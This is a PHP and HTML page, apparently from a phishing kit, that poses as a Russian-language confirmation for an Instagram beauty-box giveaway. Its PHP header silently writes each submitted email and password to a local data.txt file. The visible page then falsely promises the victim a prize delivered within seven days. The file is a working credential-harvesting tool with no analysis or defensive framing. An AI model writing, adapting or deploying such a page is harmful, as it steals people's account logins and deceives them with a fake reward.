<?php
if ($_POST['email']){
			$infoftp = $_POST['email'].":".$_POST['pass'];
			$fh=fopen("data.txt", "a+");
			fwrite($fh, "\r\n");
			fwrite($fh, $infoftp);
			fclose($fh);
			
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
	<title>Успех!</title>
	<meta charset="UTF-8">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/img-01.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="sucpic">
					<img src="images/img-01.png" alt="IMG">
                </div>
                <div class="login100-form-title-succ">
                    <h3>Ваш приз отправлен в обработку курьерской службы.</h3>
                    <h3>В течении 7 дней к вам будет доставлен Бьюти-бокс, при получении покажите ваш инстаграм аккаунт.</h3>
                </div>

			</div>
		</div>
	</div>

</body>
</html>